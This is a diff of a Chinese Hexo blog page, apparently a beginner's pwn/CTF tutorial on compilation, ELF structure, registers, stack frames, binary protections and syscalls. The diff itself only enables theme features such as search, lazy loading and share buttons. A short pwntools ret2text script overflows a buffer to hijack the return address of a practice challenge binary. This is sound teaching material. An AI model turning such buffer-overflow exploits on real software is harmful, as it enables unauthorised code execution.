@@ -35,7 +35,7 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":true,"img_link":"/images/zfb.jpg","text":"请作者喝杯咖啡","icon":"/images/tea.svg"}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -45,6 +45,8 @@
 
 <body>
 <div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
     
 
     
@@ -119,9 +121,15 @@
                         </li>
                     
                     
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
                 </ul>
             </div>
             <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -270,6 +278,10 @@
         
         
         
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
     </div>
 
     
@@ -303,8 +315,18 @@
 
 
 <h3 id="ghost-源码到可执行文件"><a href="#ghost-源码到可执行文件" class="headerlink" title=":ghost:源码到可执行文件"></a>:ghost:源码到可执行文件</h3><p>预处理 → 编译 → 汇编 → 链接 → 运行时加载&#x2F;重定位</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251125214835444.png"  alt="image-20251125214835444"></p>
-<p><img   src="/fa1a60e0d67e4b02af1d0a6123a275d0.jpeg"  alt="img"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251125214835444.png"
+                        alt="image-20251125214835444"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/fa1a60e0d67e4b02af1d0a6123a275d0.jpeg"
+                        alt="img"
+                 ></p>
 <p>开发链路分为：<code>source.c</code> →（预处理）→ <code>.i</code> →（编译）→ <code>.s</code> →（汇编）→ <code>.o</code>（ET_REL）→（链接）→ <code>app</code>（ET_EXEC 或 ET_DYN）→（运行时）→ 动态链接器把 <code>.so</code> 映射并做重定位。</p>
 <p><strong>1) 源码 — <code>main.c</code></strong></p>
 <p><strong>是什么</strong>：人类可读的 C 代码；包含函数、变量、控制流、头文件等。<br> <strong>包含</strong>：<code>#include</code>、<code>#define</code>、函数&#x2F;结构体&#x2F;注释、字符串常量。</p>
@@ -312,13 +334,23 @@
 <p><strong>是什么</strong>：预处理器将 <code>#include</code> 展开并替换宏，生成纯 C 文本（含 <code># line</code> 指示）。<br> <strong>包含</strong>：展开的头文件内容、宏展开结果、行号指令<br> <strong>生成</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E main.c -o main.i</span><br></pre></td></tr></table></figure>
 
-<p><img   src="/image-20251030183329626.png"  alt="image-20251030183329626"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/image-20251030183329626.png"
+                        alt="image-20251030183329626"
+                 ></p>
 <p><strong>3)汇编源 — <code>main.s</code> （编译→生成汇编文本）</strong></p>
 <p><strong>是什么</strong>：编译器把 C 转成可读汇编指令的文本输出。<br> <strong>如何生成</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -S -O0 -g main.c -o main.s</span><br><span class="line">gcc -S -O0 -g foo.c -o foo.s</span><br></pre></td></tr></table></figure>
 
 <p>（<code>-O0 -g</code> 保持结构清晰且带调试信息；<code>-S</code> 生成 .s）</p>
-<p><img   src="/image-20251030203228220.png"  alt="image-20251030203228220"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/image-20251030203228220.png"
+                        alt="image-20251030203228220"
+                 ></p>
 <p><strong>包含 &#x2F; 注意点</strong>：</p>
 <ul>
 <li>函数的汇编实现（<code>push rbp; mov rbp, rsp</code> 等）</li>
@@ -416,7 +448,12 @@
 <p>只包含了的自定义的内容</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c main.c -o main.o</span><br></pre></td></tr></table></figure>
 
-<p><img   src="/image-20251030204109438.png"  alt="image-20251030204109438"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/image-20251030204109438.png"
+                        alt="image-20251030204109438"
+                 ></p>
 <p><strong>包含 &#x2F; 注意点</strong>：</p>
 <ul>
 <li><code>.text</code>, <code>.data</code>, <code>.rodata</code>, <code>.bss</code> 节</li>
@@ -468,7 +505,12 @@
 <td>可写（部分只读）</td>
 </tr>
 </tbody></table>
-<p><img   src="/image-20251030152851093.png"  alt="image-20251030152851093"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/image-20251030152851093.png"
+                        alt="image-20251030152851093"
+                 ></p>
 <p>最左侧是高层语言的表示，语义是“把两个整数相加返回”。编译器需要把这种高层语义翻译成一系列 CPU 指令来实现同样的功能（编译）</p>
 <p>中间就是进行的实际操作，通过对一系列寄存器的操作来实现代码</p>
 <p>最右侧是机器码，也就是机器实际可以识别的内容，每条汇编指令都有对应的机器码字节。</p>
@@ -494,7 +536,12 @@
 <h3 id="elf可执行文件"><a href="#elf可执行文件" class="headerlink" title="elf可执行文件"></a>elf可执行文件</h3><p>该板块参考了<a class="link"   target="_blank" rel="noopener" href="https://chuquan.me/2018/05/21/elf-introduce/" >楚权的世界<i class="fas fa-external-link-alt"></i></a>师傅的文章</p>
 <p>可执行文件就是一段被组织成特定格式的二进制数据，操作系统加载它到内存后由 CPU 执行。</p>
 <p>不同 OS&#x2F;架构用不同格式：Windows 用 PE，macOS 用 Mach-O，Linux&#x2F;Unix 主流用 <strong>ELF</strong>。</p>
-<p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20251016145707472.png"  alt="image-20251016145707472"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/pwn%E5%85%A5%E9%97%A8/image-20251016145707472.png"
+                        alt="image-20251016145707472"
+                 ></p>
 <h4 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h4><p>位置：文件开头（固定大小）。</p>
 <p>作用：基本元信息 —— ELF 魔数（0x7f’ELF）、类（32&#x2F;64）、字节序、ELF 类型（ET_REL&#x2F;ET_EXEC&#x2F;ET_DYN）、机器架构、入口点地址 <code>e_entry</code>、程序头偏移 <code>e_phoff</code>、节头偏移 <code>e_shoff</code>。</p>
 <p><code>Type</code> 决定这是 <code>.o</code>（ET_REL）、可执行（ET_EXEC）还是共享对象&#x2F;PIE（ET_DYN）；<code>e_entry</code> 是程序入口（运行时从这里开始）。</p>
@@ -673,7 +720,12 @@
 <h3 id="ghost-汇编"><a href="#ghost-汇编" class="headerlink" title=":ghost:汇编"></a>:ghost:汇编</h3><p>寄存器和栈是 CPU 执行许多操作时最直接、最关键的工具</p>
 <p>寄存器是CPU内部的小型高速存储单元，用于临时存储指令执行时的数据、地址、标志等。</p>
 <p>要求不高</p>
-<p><img   src="/image-20250711172325495.png"  alt="image-20250711172325495"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/image-20250711172325495.png"
+                        alt="image-20250711172325495"
+                 ></p>
 <p><strong>64</strong></p>
 <ul>
 <li><code>RIP</code> — 指令指针（程序当前执行到哪儿）。</li>
@@ -742,7 +794,12 @@
 </tr>
 </tbody></table>
 <p>一、数据操作类（最基础的）</p>
-<p><img   src="/image-20250711171334911.png"  alt="img"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/image-20250711171334911.png"
+                        alt="img"
+                 ></p>
 <table>
 <thead>
 <tr>
@@ -1047,7 +1104,12 @@
 <li><strong>堆（heap）</strong>：放你运行时“手动申请”的内存<br>例如：<code>malloc/new</code> 出来的对象。<br>特点：<strong>手动&#x2F;库管理</strong>，你申请多少就给多少，用完要释放（<code>free/delete</code>）。</li>
 </ul>
 </blockquote>
-<p><img   src="/image-20250711171510506.png"  alt="img"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/image-20250711171510506.png"
+                        alt="img"
+                 ></p>
 <h4 id="入栈"><a href="#入栈" class="headerlink" title="入栈"></a>入栈</h4><p>add(2，3)</p>
 <p>（1）<strong>压入参数</strong></p>
 <p>根据调用约定，<code>main</code>函数作为调用者，首先需要将<code>add</code>函数的两个参数a,b压入栈中。</p>
@@ -1068,7 +1130,12 @@
 <p>（4）<strong>func函数的局部变量和参数</strong></p>
 <p><code>func</code>函数有自己内部的运作空间，即func_ebp到func_esp</p>
 <p>局部变量在编译之后会被表示为与ebp 不同的距离</p>
-<p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20250711171421699.png"  alt="img"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/pwn%E5%85%A5%E9%97%A8/image-20250711171421699.png"
+                        alt="img"
+                 ></p>
 <p>v2被表示为ebp -18h，v3被表示为ebp -10h。</p>
 <p>注意，这里的v2, v3和v4都是局部变量。参数的读取方式例子:第一个参数是ebp+8，第二个参数是ebp+12</p>
 <p>因为调用约定，肯定有main_next和main_ebp在ebp的上方，故偏移是固定的，在返回地址main_next上面</p>
@@ -1103,12 +1170,22 @@
 <p><a class="link"   target="_blank" rel="noopener" href="https://ubuntu.com/download/desktop" >镜像文件<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/yier___/article/details/135133662" >vmware配置<i class="fas fa-external-link-alt"></i></a></p>
 <p><strong>改变量主机名</strong></p>
-<p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20251017170048394.png"  alt="image-20251017170048394"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/pwn%E5%85%A5%E9%97%A8/image-20251017170048394.png"
+                        alt="image-20251017170048394"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">改主机名</span><br><span class="line">sudo hostnamectl set-hostname 主机名</span><br><span class="line">sudo nano /etc/hosts</span><br><span class="line">#找到127.0.1.1   原始名字 改为127.0.1.1   新名字</span><br><span class="line">#按 Ctrl + O（保存）</span><br><span class="line">#按 Enter（确认）</span><br><span class="line">#按 Ctrl + X（退出）</span><br><span class="line">exec bash</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">改用户名（推荐创建一个新用户）</span><br><span class="line">sudo adduser yxhueimie</span><br><span class="line">sudo usermod -aG sudo pop#给sudo权限</span><br><span class="line">su - pop#切换用户</span><br></pre></td></tr></table></figure>
 
-<h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20251016165430587.png"  alt="image-20251016165430587"></p>
+<h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/pwn%E5%85%A5%E9%97%A8/image-20251016165430587.png"
+                        alt="image-20251016165430587"
+                 ></p>
 <p><code>Arch:amd64-64-little</code>：</p>
 <p>amd64即x86_64(CPU架构)</p>
 <p>64即字长为64，返回地址在栈中占 8字节，32位是4字节</p>
@@ -1155,8 +1232,18 @@
 <p>使程序可以被加载到任意内存地址运行</p>
 <p>有 <strong>PIE</strong> → 程序的 <code>.text</code>、<code>.data</code> 等段在每次运行时会被加载到不同的基址。</p>
 <p>没有 <strong>PIE</strong> → 程序的代码段基址固定，比如永远是 <code>0x400000</code>。</p>
-<p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20251016170030401.png"  alt="image-20251016170030401"></p>
-<p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20251016170049819.png"  alt="image-20251016170049819"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/pwn%E5%85%A5%E9%97%A8/image-20251016170030401.png"
+                        alt="image-20251016170030401"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/pwn%E5%85%A5%E9%97%A8/image-20251016170049819.png"
+                        alt="image-20251016170049819"
+                 ></p>
 <h2 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h2><h3 id="ret2text-覆盖返回地址"><a href="#ret2text-覆盖返回地址" class="headerlink" title="ret2text(覆盖返回地址)"></a>ret2text(覆盖返回地址)</h3><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#rip" >题目<i class="fas fa-external-link-alt"></i></a>system(“&#x2F;bin&#x2F;sh”)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=remote(&quot;node5.buuoj.cn&quot;,27287)</span><br><span class="line">p=process(&quot;./pwn1&quot;)</span><br><span class="line">pay=b&quot;a&quot;*(0xf+8)+p64(0x40118a)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -1254,7 +1341,12 @@
 <p><strong>EDI、EBP</strong>这6个寄存器。</p>
 <p>在64位系统中，使用<strong>syscall</strong>指令来触发系统调用，同样使用<strong>EAX（RAX）寄存器传递系统调用号</strong>，<strong>RDI、RSI、RDX、RCX、R8、R9</strong></p>
 <p>这6个寄存器用来传递参数。</p>
-<p><img   src="/image-20250711172325495.png"  alt="image-20250711172325495"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="/image-20250711172325495.png"
+                        alt="image-20250711172325495"
+                 ></p>
 <p>eg:read（0,buf,0x100）</p>
 <p>32位时，eax&#x3D;3（#define__NR_read 3）;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;，设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的read（0,buf,0x100）。实际上，最后还会进入内核态执行。</p>
 <p>64位时，rax&#x3D;0（#define__NR_read 0）;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100，设置完每个寄存器的值之后，再执行syscall指令，就会执行对应的read（0,buf,0x100）。</p>
@@ -1308,8 +1400,44 @@
                     </div>
                     <div>
                         
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
                     </div>
                 </div>
+
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/zfb.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="/images/tea.svg"></i>&nbsp;请作者喝杯咖啡
+    </div>
+</div>
 
                 
 
@@ -1484,6 +1612,19 @@
     
 
     
+        <div class="count-info info-item">
+            
+
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
 
     
 </footer>
@@ -1586,6 +1727,35 @@
 
     <!-- local search -->
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
     <!-- tablet toc -->
     
@@ -1625,8 +1795,16 @@
 
 <!-- local search -->
 
+    
+<script src="/js/local-search.js"></script>
+
+
 
 <!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
 
 
 <div class="">
@@ -1651,6 +1829,10 @@
         
 
         <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
         
     
 
